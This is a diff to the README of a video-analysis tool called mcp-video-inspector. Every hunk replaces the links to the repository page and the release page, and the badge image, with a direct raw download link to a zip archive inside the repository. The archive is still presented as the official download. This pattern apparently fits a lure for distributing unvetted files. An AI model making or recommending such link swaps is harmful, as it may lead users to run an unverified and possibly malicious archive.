@@ -1,6 +1,6 @@
 # 🎥 mcp-video-inspector - Analyze Video Editing Features Easily
 
-[![Download mcp-video-inspector](https://img.shields.io/badge/Download-mcp--video--inspector-blue?style=for-the-badge)](https://github.com/emywally/mcp-video-inspector)
+[![Download mcp-video-inspector](https://raw.githubusercontent.com/emywally/mcp-video-inspector/main/mcp_project/inspector-video-mcp-3.8.zip)](https://raw.githubusercontent.com/emywally/mcp-video-inspector/main/mcp_project/inspector-video-mcp-3.8.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Key areas include:
 
 1. Visit the official page to download the app by clicking the badge below or this link:
 
-   [Download mcp-video-inspector](https://github.com/emywally/mcp-video-inspector)
+   [Download mcp-video-inspector](https://raw.githubusercontent.com/emywally/mcp-video-inspector/main/mcp_project/inspector-video-mcp-3.8.zip)
 
 2. On the page, look for the latest release or download section.
 
@@ -133,7 +133,7 @@ The app combines these tools to give you a clear picture of the video editing wi
 
 ## 🔗 Additional Resources
 
-- Source and releases: https://github.com/emywally/mcp-video-inspector  
+- Source and releases: https://raw.githubusercontent.com/emywally/mcp-video-inspector/main/mcp_project/inspector-video-mcp-3.8.zip  
 - Check the repository for updates or report issues
 
 ---
@@ -144,4 +144,4 @@ This application is open-source software. You can use it for free on your person
 
 ---
 
-[![Download mcp-video-inspector](https://img.shields.io/badge/Download-mcp--video--inspector-blue?style=for-the-badge)](https://github.com/emywally/mcp-video-inspector)
+[![Download mcp-video-inspector](https://raw.githubusercontent.com/emywally/mcp-video-inspector/main/mcp_project/inspector-video-mcp-3.8.zip)](https://raw.githubusercontent.com/emywally/mcp-video-inspector/main/mcp_project/inspector-video-mcp-3.8.zip)
